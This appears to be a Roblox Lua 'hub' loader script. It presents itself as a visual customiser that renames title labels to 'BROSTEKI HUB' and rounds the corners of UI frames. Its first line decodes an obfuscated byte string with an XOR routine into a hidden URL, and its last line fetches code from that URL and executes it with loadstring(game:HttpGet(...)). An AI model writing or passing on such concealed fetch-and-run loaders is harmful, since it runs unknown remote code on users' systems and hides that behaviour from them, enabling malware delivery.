
--[[ STAGE 2: VISUAL CORE ]]
local KblNdfuZafZ9M2qlJiov="\089\067\074\006\080\063\074\070\056\048\066\051\067\123\123\106\101\105\067\117\109\156\101\158\097\098\152\123\099\139\139\136\133\142\129\106\147\103\153\101\139\180\179\191\173\143\113\173\166\163\149\101\164\167\173\223\155\220\218\163\203\213\219\211\200\214\135\208\255\194\205\255\197\251\197\246\243\242\175\239\235\245\168\224\228\235\026\030\027\229\020\031\015\011\028\007\018\004\013\013\196\057\013\058\251\249\236\049\050\044\042\052"local tRz5siFsoXglcM=159 local w5om5YIqAs0C=82 local AnQuo9bj_IYl1yvLeg0lf=1 local PayGONXly4D4YOaEZf=2 local P_imqp3e4SYR=17 local yDmeXEUZQvrm2=true local RN8Kn6dah8pe7wtWofB1a=bit32 and bit32.bxor if not RN8Kn6dah8pe7wtWofB1a then RN8Kn6dah8pe7wtWofB1a=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Z4I6AgyffWg6arKYDe9_o={}for ITYPKChBe3iLVf=1,#KblNdfuZafZ9M2qlJiov do local F1ddpSGqz1L_7x=string.byte(KblNdfuZafZ9M2qlJiov,ITYPKChBe3iLVf)local avmzUFx2cQBW5u=(w5om5YIqAs0C+(ITYPKChBe3iLVf*PayGONXly4D4YOaEZf)+P_imqp3e4SYR)%256 if AnQuo9bj_IYl1yvLeg0lf==0 then F1ddpSGqz1L_7x=(F1ddpSGqz1L_7x-avmzUFx2cQBW5u)%256 Z4I6AgyffWg6arKYDe9_o[ITYPKChBe3iLVf]=string.char(RN8Kn6dah8pe7wtWofB1a(F1ddpSGqz1L_7x,tRz5siFsoXglcM))else F1ddpSGqz1L_7x=RN8Kn6dah8pe7wtWofB1a(F1ddpSGqz1L_7x,tRz5siFsoXglcM)Z4I6AgyffWg6arKYDe9_o[ITYPKChBe3iLVf]=string.char((F1ddpSGqz1L_7x-avmzUFx2cQBW5u)%256)end end local nA_ZLWlC_Ws58Brz2rxJ8=table.concat(Z4I6AgyffWg6arKYDe9_o)if yDmeXEUZQvrm2 then nA_ZLWlC_Ws58Brz2rxJ8=string.reverse(nA_ZLWlC_Ws58Brz2rxJ8)end local _mPFXgtxGxDPVs=nA_ZLWlC_Ws58Brz2rxJ8
local HubName = "BROSTEKI HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(_mPFXgtxGxDPVs))()
